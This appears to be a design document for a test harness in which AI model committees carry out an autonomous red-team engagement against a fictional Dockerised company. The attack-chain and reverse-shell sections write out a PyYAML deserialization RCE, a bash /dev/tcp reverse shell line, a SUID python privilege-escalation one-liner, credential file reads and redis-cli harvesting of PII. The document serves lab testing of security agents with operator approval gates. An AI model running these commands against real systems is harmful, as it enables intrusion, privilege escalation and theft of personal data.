# Red Team System Test — Meridian Systems

Design and implementation notes for the **redteamv1** ensemble against the Meridian Systems
demo target. Companion to `ENSEMBLES.md`, `BRIEFING.md`, and `ENSEMBLE_UI.md`.

Status: **implemented** (`tests/system/redteam_easy/`)

---

## 1. Purpose

Validate the ensemble harness against a realistic red team engagement. Three goals:

1. **Technical credibility** — the engagement must be indistinguishable in method from human
   red team work, mapped to MITRE ATT&CK throughout. The audience is an experienced red team director.
2. **Operator interaction showcase** — gate approvals, mid-run ask_operator, and pivot approval.
3. **Autonomy** — committees drive the engagement from the approved plan; models discover the
   attack path from findings, not from hardcoded scripts.

---

## 2. Target Design

### 2.1 Company profile

**Meridian Systems** — fictional mid-size B2B SaaS company running an internal configuration
management portal built on Flask + PyYAML.

Crown jewels: customer PII in an unauthenticated-from-the-outside Redis store — 10 customer
records (name, email, address, phone, plan tier) plus active session tokens.

### 2.2 Docker Compose topology

```
  [internet / Claude API]
        │
  external-net (bridge, outbound allowed)
        │
  athena_web ──── engagement-net (bridge, internal) ──── target (Flask / PyYAML RCE)
                                                               │
                                              db-net (bridge, internal)
                                                               │
                                                         redis (PII store)
```

Four containers:

| Container | Networks | Role |
|-----------|----------|------|
| `athena_web` | external-net + engagement-net | Athena runner; reverse shell listener |
| `target` | engagement-net + db-net | Flask web app; vulnerable to PyYAML RCE |
| `redis` | db-net only | Redis with auth; holds crown jewels |
| `redis_seeder` | db-net only | One-shot seed container; exits after loading data |

`athena_web` **cannot reach `redis` directly** — the only path is through the reverse shell
on `target`. This makes the privesc → credential → pivot chain causally necessary.

### 2.3 Vulnerabilities seeded

**target (Meridian Flask app):**
- `pyyaml==3.13` — CVE-2017-18342, `yaml.load()` without `Loader`
- `/api/parse-config` — accepts user-supplied YAML; calls `yaml.load(data)` directly
- `/debug` — exposes all installed package versions (developer mistake left in production)
- SUID bit set on `/usr/bin/python3.10` — T1548.001 privilege escalation
- Flask process runs as `www-data` — privesc required for root access
- `/root/.redis_password` — Redis auth credential, readable only by root (mode 600)

**redis:**
- `requirepass Meridian2024!` — authentication required; credential not directly accessible
- `customer:*` keys — JSON PII records (10 records: name, email, address, phone, plan)
- `session:*` keys — active session tokens (bonus finding)

---

## 3. Attack Chain

Full kill chain with MITRE ATT&CK technique IDs. The committees discover this path
autonomously from the engagement brief and recon findings.

```
── Recon Committee ────────────────────────────────────────────────────────────

  T1046   Network Service Discovery
          nmap → port 5000 open, Flask/Python identified

  T1190   Exploit Public-Facing Application (hypothesis)
          web_enum → /debug discovered (status 200)
          /debug exposes packages: pyyaml==3.13
          searchsploit → CVE-2017-18342 identified
          web_enum → /api/parse-config discovered

          ↓ Foundation-Sec synthesises ATT&CK surface assessment + kill chain hypotheses

── Planning Committee ─────────────────────────────────────────────────────────

  Three exploit planners produce competing plans (2× Haiku, 1× Foundation-Sec).
  Leader selects best candidate.

  Planned vectors:
  1. PyYAML deserialization RCE on /api/parse-config (PRIMARY — CVE-2017-18342)
  2. SUID python3.10 privilege escalation (if shell obtained)
  3. Redis pivot after credential retrieval

          ↓ OPERATOR APPROVAL GATE

── Exploitation Committee ─────────────────────────────────────────────────────

  T1190   Exploit Public-Facing Application
          POST /api/parse-config with !!python/object/apply:subprocess.Popen payload
          → RCE confirmed

  T1059.004  Unix Shell
          Reverse shell: bash -i >& /dev/tcp/athena_web/4444 0>&1
          athena_web:4444 receives connection — shell as www-data

  T1046   Network Service Discovery
          From shell: nc or bash /dev/tcp probe → redis:6379 open
          AUTH error confirms Redis requires password

  T1548.001  Setuid and Setgid
          find / -perm /4000 → /usr/bin/python3.10 has SUID
          ↓ ask_operator: "SUID python3.10 found. Approve privilege escalation?"
          ↓ OPERATOR APPROVES
          python3.10 -c 'import os; os.execl("/bin/bash", "bash", "-p")'
          → root shell (euid=0)

  T1552   Unsecured Credentials
          cat /root/.redis_password → Meridian2024!

  T1021   Remote Services (lateral movement)
          ↓ ask_operator: "Root shell on target. Redis at redis:6379 requires auth.
            Retrieved credential from /root/.redis_password. Approve pivot and harvest?"
          ↓ OPERATOR APPROVES
          redis-cli -h redis -a Meridian2024! KEYS '*'
          → customer:* (10 records) + session:* (3 tokens)

  T1005   Data from Local System
          redis-cli GET customer:1 ... → PII confirmed, harvest complete

── Reporting Committee ────────────────────────────────────────────────────────

  Foundation-Sec maps full kill chain to ATT&CK; assesses severity.
  report_writer formats: executive summary + technical findings + kill chain + remediation.
```

---

## 4. Ensemble Structure

Four committees, linear workflow with a single hardcoded operator-approval gate:

```
recon ──► planning ──[operator_approval]──► exploit ──► reporting
```

### 4.1 Recon Committee

| Element | Model | Role |
|---------|-------|------|
| `port_scan` | claude-haiku-4-5 | nmap service/version scan |
| `web_enum` | claude-haiku-4-5 | HTTP path enumeration; discovers /debug and /api/parse-config |
| `cve_lookup` | claude-haiku-4-5 | searchsploit for discovered services; CVE-2017-18342 |
| `threat_analyst` | Foundation-Sec | Reasoning-only ATT&CK surface assessment |

### 4.2 Planning Committee

Three `exploit_planner` instances (Haiku A, Haiku B, Foundation-Sec) produce competing plans.
Leader selects best on specificity, ATT&CK mapping, and feasibility.

Gate: `operator_approval` before exploit traffic begins.

### 4.3 Exploitation Committee

| Element | Model | Role |
|---------|-------|------|
| `web_exploiter` | claude-sonnet-4-6 | http_get, http_post, get_shell |
| `shell_operator` | claude-sonnet-4-6 | run_cmd, close_shell |

Two mandatory ask_operator moments: before privesc, before Redis pivot.

### 4.4 Reporting Committee

| Element | Model | Role |
|---------|-------|------|
| `findings_analyst` | Foundation-Sec | ATT&CK kill chain mapping, severity, remediation |
| `report_writer` | claude-haiku-4-5 | Formats structured findings into report sections |

Note: `findings_analyst` is not yet in the manifest — currently only `report_writer` exists.
Adding Foundation-Sec to reporting is the next implementation step.

---

## 5. Skills

| Skill | Status | Notes |
|-------|--------|-------|
| `nmap_scan` | ✅ | Port/service/version discovery |
| `web_enum` | ✅ | Builtin wordlist includes /debug, /api/parse-config |
| `searchsploit` | ✅ | ExploitDB CVE lookup; may not have pyyaml entry — Foundation-Sec fallback |
| `http_get` | ✅ | HTTP GET probe |
| `http_post` | ✅ | HTTP POST; used for exploit delivery |
| `get_shell` | ✅ | Pwntools listener + exploit POST → session_id |
| `run_cmd` | ✅ | Command in active shell session |
| `close_shell` | ✅ | Tear down shell connection |

**pwntools** added to `[project.optional-dependencies] dev` in `pyproject.toml`.
Installed in harness via `pip install -e ".[dev]"` in Dockerfile.

---

## 6. Reverse Shell Mechanic

1. `get_shell` starts a pwntools listener on `0.0.0.0:4444` (before payload fires)
2. `web_exploiter` POSTs a PyYAML `!!python/object/apply:subprocess.Popen` payload
3. Flask calls `yaml.load()` → spawns bash reverse shell to `athena_web:4444`
4. `get_shell` receives connection; returns `session_id`
5. `shell_operator` calls `run_cmd(session_id, cmd)` for each subsequent command

Output delimiting: each command appended with `; echo __DONE_<uuid>__`; pwntools
`recvuntil` reads until sentinel.

---

## 7. Operator Interaction Points

| # | Moment | Mechanism | Operator sees |
|---|--------|-----------|---------------|
| 1 | Briefing | `orchestrator.ask_user` | Engagement setup dialogue |
| 2 | Plan ready | `engagement.plan_ready` | Attack vectors; approve before exploit traffic |
| 3 | After Planning | `gate.awaiting_approval` | Operator approval gate fires |
| 4 | SUID discovered | `committee.ask_operator` | "SUID python3.10 found. Approve privilege escalation?" |
| 5 | Redis discovered | `committee.ask_operator` | "Root shell obtained. Redis credential in /root/.redis_password. Approve pivot?" |

Moments 4 and 5 are the showcase centrepiece: the graph freezes on the Exploit node
and the operator makes a specific, consequential decision with evidence.

---

## 8. MITRE ATT&CK Coverage

| Tactic | Technique | Committee |
|--------|-----------|-----------|
| Discovery | T1046 Network Service Discovery | Recon (nmap) + Exploit (internal probe) |
| Initial Access | T1190 Exploit Public-Facing App | Exploit (PyYAML RCE) |
| Execution | T1059.004 Unix Shell | Exploit (reverse bash shell) |
| Privilege Escalation | T1548.001 Setuid/Setgid | Exploit (SUID python3) |
| Credential Access | T1552 Unsecured Credentials | Exploit (root reads /root/.redis_password) |
| Lateral Movement | T1021 Remote Services | Exploit (redis-cli to internal Redis) |
| Collection | T1005 Data from Local System | Exploit (PII harvest from Redis) |

Foundation-Sec responsible for technique mapping: hypothesis in ReconOutput,
confirmation in ReportOutput.

---

## 9. Known Gaps

- **`findings_analyst` element missing from reporting committee** — currently only
  `report_writer` (Haiku) is registered. The reporting leader handles summarisation
  but lacks Foundation-Sec's CVE/ATT&CK depth. Adding a Foundation-Sec reasoning element
  to reporting is the next step.

- **searchsploit pyyaml coverage uncertain** — ExploitDB may not have a dedicated pyyaml
  entry. The fallback path (threat_analyst reasons from Foundation-Sec model knowledge)
  is solid. CVE-2017-18342 is well-known in the security community.

- **Reporting leader prompt still references HTB flag examples** — cosmetic; should be
  updated to reflect PII harvest as the success criterion.
